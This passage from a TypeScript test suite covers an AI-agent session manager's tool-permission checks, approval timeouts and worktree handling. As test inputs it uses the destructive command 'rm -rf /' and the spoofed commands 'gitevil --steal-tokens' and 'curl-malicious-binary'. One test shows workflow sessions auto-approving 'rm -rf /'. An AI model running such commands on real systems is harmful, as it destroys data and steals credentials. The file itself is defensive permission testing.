      expect((session as any)._apiRetryCount).toBe(0)
      vi.useRealTimers()
    })
  })

  describe('matchesAllowedTools', () => {
    let sm: SessionManager

    beforeEach(() => {
      sm = new SessionManager()
    })

    function match(allowedTools: string[], toolName: string, toolInput: Record<string, unknown>): boolean {
      return (sm as any).matchesAllowedTools(allowedTools, toolName, toolInput)
    }

    it('matches simple tool names', () => {
      expect(match(['WebFetch', 'Read'], 'WebFetch', {})).toBe(true)
      expect(match(['WebFetch', 'Read'], 'Read', {})).toBe(true)
      expect(match(['WebFetch', 'Read'], 'Write', {})).toBe(false)
    })

    it('matches Bash prefix patterns with word boundary', () => {
      expect(match(['Bash(curl:*)'], 'Bash', { command: 'curl https://example.com' })).toBe(true)
      expect(match(['Bash(curl:*)'], 'Bash', { command: 'curl' })).toBe(true)
    })

    it('rejects Bash commands that share a prefix but are different commands', () => {
      // This was the critical bug: 'curl-malicious' should NOT match 'Bash(curl:*)'
      expect(match(['Bash(curl:*)'], 'Bash', { command: 'curl-malicious-binary' })).toBe(false)
      expect(match(['Bash(git:*)'], 'Bash', { command: 'gitevil --steal-tokens' })).toBe(false)
    })

    it('handles leading whitespace in commands', () => {
      expect(match(['Bash(curl:*)'], 'Bash', { command: '  curl https://example.com' })).toBe(true)
    })

    it('rejects non-matching tool name in parameterized pattern', () => {
      expect(match(['Bash(curl:*)'], 'Read', { command: 'curl foo' })).toBe(false)
    })

    it('handles empty/missing command', () => {
      expect(match(['Bash(curl:*)'], 'Bash', {})).toBe(false)
      expect(match(['Bash(curl:*)'], 'Bash', { command: '' })).toBe(false)
    })
  })

  describe('getDiff', () => {
    it('returns diff_error when session not found', async () => {
      const sm = new SessionManager()
      const result = await sm.getDiff('nonexistent-session')
      expect(result).toEqual({ type: 'diff_error', message: 'Session not found' })
    })

    it('delegates to diffManager.getDiff with session workingDir', async () => {
      const sm = new SessionManager()
      const s = sm.create('test-session', '/tmp/test-repo')
      const diffManager = (sm as any).diffManager
      const mockResult = { type: 'diff_result' as const, files: [] }
      const spy = vi.spyOn(diffManager, 'getDiff').mockResolvedValue(mockResult)

      const result = await sm.getDiff(s.id, 'all')

      expect(spy).toHaveBeenCalledWith('/tmp/test-repo', 'all')
      expect(result).toEqual(mockResult)
    })
  })

  // =====================================================================
  // Coverage expansion: worktree, client lifecycle, tool approval timeout
  // =====================================================================

  describe('createWorktree()', () => {
    afterEach(() => {
      mockExecFile.mockReset()
    })

    it('returns worktree path on success', async () => {
      const s = sm.create('wt-test', '/repos/myproject')

      // Mock execFile: callback style (cmd, args, opts, cb)
      mockExecFile.mockImplementation((_cmd: string, args: string[], _opts: any, cb?: any) => {
        if (typeof cb === 'function') {
          if (args[0] === 'rev-parse') {
            cb(null, '/repos/myproject\n', '')
          } else {
            cb(null, '', '')
          }
        }
        return { on: vi.fn() }
      })

      const result = await sm.createWorktree(s.id, '/repos/myproject')

      expect(result).not.toBeNull()
      expect(result).toContain('-wt-')
      expect(result).toContain(s.id.slice(0, 8))
    })

    it('returns null on git failure', async () => {
      const s = sm.create('wt-fail', '/repos/myproject')

      // Mock execFile to fail on worktree add
      mockExecFile.mockImplementation((_cmd: string, args: string[], _opts: any, cb?: any) => {
        if (typeof cb === 'function') {
          if (args[0] === 'rev-parse') {
            cb(null, '/repos/myproject\n', '')
          } else if (args[0] === 'worktree' && args[1] === 'add') {
            cb(new Error('fatal: worktree add failed'), '', 'fatal: worktree add failed')
          } else {
            cb(null, '', '')
          }
        }
        return { on: vi.fn() }
      })

      const result = await sm.createWorktree(s.id, '/repos/myproject')

      expect(result).toBeNull()
    })

    it('returns null for unknown session', async () => {
      const result = await sm.createWorktree('nonexistent', '/repos/myproject')
      expect(result).toBeNull()
    })

    it('updates session.workingDir and session.groupDir on success', async () => {
      const s = sm.create('wt-update', '/repos/myproject')

      mockExecFile.mockImplementation((_cmd: string, args: string[], _opts: any, cb?: any) => {
        if (typeof cb === 'function') {
          if (args[0] === 'rev-parse') {
            cb(null, '/repos/myproject\n', '')
          } else {
            cb(null, '', '')
          }
        }
        return { on: vi.fn() }
      })

      const worktreePath = await sm.createWorktree(s.id, '/repos/myproject')

      expect(worktreePath).not.toBeNull()
      expect(s.workingDir).toBe(worktreePath)
      expect(s.groupDir).toBe('/repos/myproject')
      expect(s.worktreePath).toBe(worktreePath)
    })

    it('returns null when rev-parse returns invalid path', async () => {
      const s = sm.create('wt-invalid-root', '/repos/myproject')

      mockExecFile.mockImplementation((_cmd: string, args: string[], _opts: any, cb?: any) => {
        if (typeof cb === 'function') {
          if (args[0] === 'rev-parse') {
            // Return a relative path (invalid)
            cb(null, 'relative/path\n', '')
          } else {
            cb(null, '', '')
          }
        }
        return { on: vi.fn() }
      })

      const result = await sm.createWorktree(s.id, '/repos/myproject')
      expect(result).toBeNull()
    })
  })

  describe('client lifecycle: join/leave grace timer', () => {
    it('join re-broadcasts pending tool approval prompts', () => {
      const s = sm.create('rejoin-test', '/tmp')
      const promptMsg = { type: 'prompt', promptType: 'permission', question: 'Allow Bash?', toolName: 'Bash', requestId: 'r1' }
      s.pendingToolApprovals.set('r1', {
        resolve: vi.fn(),
        toolName: 'Bash',
        toolInput: { command: 'ls' },
        requestId: 'r1',
        promptMsg: promptMsg as any,
      })

      const ws = fakeWs()
      sm.join(s.id, ws)

      // The pending prompt should have been re-broadcast to the joining client
      expect(ws.send).toHaveBeenCalled()
      const sent = JSON.parse(ws.send.mock.calls[0][0])
      expect(sent.type).toBe('prompt')
      expect(sent.toolName).toBe('Bash')
    })

    it('join re-broadcasts pending control request prompts', () => {
      const s = sm.create('rejoin-ctrl', '/tmp')
      const promptMsg = { type: 'prompt', promptType: 'permission', question: 'Allow Write?', toolName: 'Write', requestId: 'c1' }
      s.pendingControlRequests.set('c1', {
        requestId: 'c1',
        toolName: 'Write',
        toolInput: { file_path: '/tmp/x' },
        promptMsg: promptMsg as any,
      })

      const ws = fakeWs()
      sm.join(s.id, ws)

      expect(ws.send).toHaveBeenCalled()
      const sent = JSON.parse(ws.send.mock.calls[0][0])
      expect(sent.type).toBe('prompt')
      expect(sent.toolName).toBe('Write')
    })

    it('join cancels leave grace timer', () => {
      vi.useFakeTimers()
      const s = sm.create('grace-cancel', '/tmp')
      const ws1 = fakeWs()
      sm.join(s.id, ws1)

      const resolve = vi.fn()
      s.pendingToolApprovals.set('r1', { resolve, toolName: 'Bash', toolInput: { command: 'ls' }, requestId: 'r1' })

      // Last client leaves — starts grace timer
      sm.leave(s.id, ws1)
      expect(s._leaveGraceTimer).not.toBeNull()

      // New client joins before grace period expires — timer should be cancelled
      const ws2 = fakeWs()
      sm.join(s.id, ws2)
      expect(s._leaveGraceTimer).toBeNull()

      // Advance past the grace period — should NOT auto-deny since timer was cancelled
      vi.advanceTimersByTime(5000)
      expect(resolve).not.toHaveBeenCalled()
      expect(s.pendingToolApprovals.size).toBe(1)

      vi.useRealTimers()
    })

    it('leave starts grace timer only when last client leaves', () => {
      vi.useFakeTimers()
      const s = sm.create('grace-multi', '/tmp')
      const ws1 = fakeWs()
      const ws2 = fakeWs()
      sm.join(s.id, ws1)
      sm.join(s.id, ws2)

      // Remove first client — not the last, so no grace timer started
      sm.leave(s.id, ws1)
      expect(s._leaveGraceTimer).toBeNull()
      expect(s.clients.size).toBe(1)

      // Remove last client — grace timer should start
      sm.leave(s.id, ws2)
      expect(s._leaveGraceTimer).not.toBeNull()
      expect(s.clients.size).toBe(0)

      vi.useRealTimers()
    })
  })

  describe('tool approval timeout (300s)', () => {
    beforeEach(() => {
      vi.useFakeTimers()
    })

    afterEach(() => {
      vi.useRealTimers()
    })

    it('auto-denies tool approval after 300 seconds for interactive sessions', async () => {
      const s = sm.create('timeout-test', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const approvalPromise = sm.requestToolApproval(s.id, 'Bash', { command: 'rm -rf /' })

      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance 299 seconds — not timed out yet
      vi.advanceTimersByTime(299_000)
      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance past 300 seconds — should auto-deny
      vi.advanceTimersByTime(2_000)

      const result = await approvalPromise
      expect(result).toEqual({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)

      // Should have sent prompt_dismiss to clients
      const dismissMsgs = ws.send.mock.calls
        .map((c: any) => JSON.parse(c[0]))
        .filter((m: any) => m.type === 'prompt_dismiss')
      expect(dismissMsgs.length).toBeGreaterThanOrEqual(1)
    })

    it('agent sessions also time out at 5 minutes (same as all approval types)', async () => {
      const s = sm.create('agent-timeout', '/tmp')
      s.source = 'agent'
      const ws = fakeWs()
      sm.join(s.id, ws)

      const approvalPromise = sm.requestToolApproval(s.id, 'Bash', { command: 'ls' })

      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance 299 seconds — should NOT time out yet
      vi.advanceTimersByTime(299_000)
      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance past 300 seconds — should time out
      vi.advanceTimersByTime(2_000)

      const result = await approvalPromise
      expect(result).toEqual({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('uses 5-minute timeout for AskUserQuestion', async () => {
      const s = sm.create('question-timeout', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const approvalPromise = sm.requestToolApproval(s.id, 'AskUserQuestion', {
        questions: [{ question: 'Pick a color' }],
      })

      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance 60 seconds — should NOT time out for questions
      vi.advanceTimersByTime(60_000)
      expect(s.pendingToolApprovals.size).toBe(1)

      // Advance to 5 minutes — should time out
      vi.advanceTimersByTime(240_000)

      const result = await approvalPromise
      expect(result).toEqual({ allow: false, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('clears timeout when approval is resolved before timeout', async () => {
      const s = sm.create('early-resolve', '/tmp')
      const ws = fakeWs()
      sm.join(s.id, ws)

      const approvalPromise = sm.requestToolApproval(s.id, 'Bash', { command: 'echo hi' })

      expect(s.pendingToolApprovals.size).toBe(1)

      // Resolve the approval before timeout
      const pending = s.pendingToolApprovals.values().next().value!
      pending.resolve({ allow: true, always: false })

      const result = await approvalPromise
      expect(result).toEqual({ allow: true, always: false })

      // Advance past timeout — should not cause issues (timer was cleared)
      vi.advanceTimersByTime(70_000)
      // No error, no double-resolve
    })
  })

  describe('resolveAutoApproval() via allowedTools', () => {
    it('auto-approves when tool matches session allowedTools (simple name)', async () => {
      const s = sm.create('allowed-tools', '/tmp', { allowedTools: ['WebFetch', 'Read'] })

      const result = await sm.requestToolApproval(s.id, 'WebFetch', {})
      expect(result).toEqual({ allow: true, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('auto-approves Bash with parameterized pattern in allowedTools', async () => {
      const s = sm.create('bash-pattern', '/tmp', { allowedTools: ['Bash(curl:*)'] })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'curl https://example.com' })
      expect(result).toEqual({ allow: true, always: false })
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('does not auto-approve Bash when command does not match pattern', async () => {
      const s = sm.create('bash-no-match', '/tmp', { allowedTools: ['Bash(curl:*)'] })
      const ws = fakeWs()
      sm.join(s.id, ws)

      const promise = sm.requestToolApproval(s.id, 'Bash', { command: 'wget https://example.com' })

      // Should prompt — not auto-approved
      expect(s.pendingToolApprovals.size).toBe(1)

      // Resolve to avoid leaked promise
      s.pendingToolApprovals.values().next().value!.resolve({ allow: false, always: false })
      await promise
    })

    it('does not auto-approve tool not in allowedTools list', async () => {
      const s = sm.create('not-allowed', '/tmp', { allowedTools: ['Read'] })
      const ws = fakeWs()
      sm.join(s.id, ws)

      const promise = sm.requestToolApproval(s.id, 'Write', { file_path: '/tmp/x' })

      expect(s.pendingToolApprovals.size).toBe(1)

      s.pendingToolApprovals.values().next().value!.resolve({ allow: false, always: false })
      await promise
    })

    it('auto-approves Bash with exact prefix match in allowedTools', async () => {
      const s = sm.create('bash-exact', '/tmp', { allowedTools: ['Bash(git:*)'] })

      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'git status' })
      expect(result).toEqual({ allow: true, always: false })
    })

    it('does not match parameterized pattern for wrong tool name', async () => {
      const s = sm.create('wrong-tool', '/tmp', { allowedTools: ['Bash(curl:*)'] })
      const ws = fakeWs()
      sm.join(s.id, ws)

      const promise = sm.requestToolApproval(s.id, 'Write', { command: 'curl something' })

      expect(s.pendingToolApprovals.size).toBe(1)

      s.pendingToolApprovals.values().next().value!.resolve({ allow: false, always: false })
      await promise
    })
  })

  describe('agent session headless behavior', () => {
    it('agent sessions use allowedTools as permission boundary, not blanket headless', async () => {
      // Agent child session with specific allowed tools and NO browser client
      const s = sm.create('agent-child', '/tmp', {
        source: 'agent',
        allowedTools: ['Read', 'Bash(git:*)'],
      })
      // No ws.join — simulates headless (no browser tab)

      // Tool in allowedTools → auto-approved via 'session' path
      const readResult = await sm.requestToolApproval(s.id, 'Read', { file_path: '/tmp/foo' })
      expect(readResult).toEqual({ allow: true, always: false })

      const gitResult = await sm.requestToolApproval(s.id, 'Bash', { command: 'git status' })
      expect(gitResult).toEqual({ allow: true, always: false })
    })

    it('agent sessions fast-deny tools NOT in allowedTools when headless', async () => {
      const s = sm.create('agent-blocked', '/tmp', {
        source: 'agent',
        allowedTools: ['Read'],
      })
      // No ws.join — headless

      // Tool NOT in allowedTools → fast-deny (no 5-min hang)
      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'rm -rf /' })

      expect(result).toEqual({ allow: false, always: false })
      // Should NOT create a pending approval — denied immediately
      expect(s.pendingToolApprovals.size).toBe(0)
    })

    it('non-agent headless sources still get blanket auto-approval', async () => {
      const s = sm.create('workflow-headless', '/tmp', {
        source: 'workflow',
      })
      // No ws.join — headless

      // Workflow sessions get blanket headless approval for any tool
      const result = await sm.requestToolApproval(s.id, 'Bash', { command: 'rm -rf /' })
      expect(result).toEqual({ allow: true, always: false })
    })
  })

  describe('discardChanges', () => {
    it('returns diff_error when session not found', async () => {
      const sm = new SessionManager()
      const result = await sm.discardChanges('nonexistent-session', 'all')
      expect(result).toEqual({ type: 'diff_error', message: 'Session not found' })
    })

    it('delegates to diffManager.discardChanges with session workingDir and all params', async () => {
      const sm = new SessionManager()
      const s = sm.create('test-session', '/tmp/test-repo')
      const diffManager = (sm as any).diffManager
      const mockResult = { type: 'discard_result' as const }
      const spy = vi.spyOn(diffManager, 'discardChanges').mockResolvedValue(mockResult)
      const paths = ['file1.ts', 'file2.ts']
      const statuses: Record<string, string> = { 'file1.ts': 'modified', 'file2.ts': 'added' }

      const result = await sm.discardChanges(s.id, 'staged', paths, statuses as any)

      expect(spy).toHaveBeenCalledWith('/tmp/test-repo', 'staged', paths, statuses)
      expect(result).toEqual(mockResult)
    })
  })
})
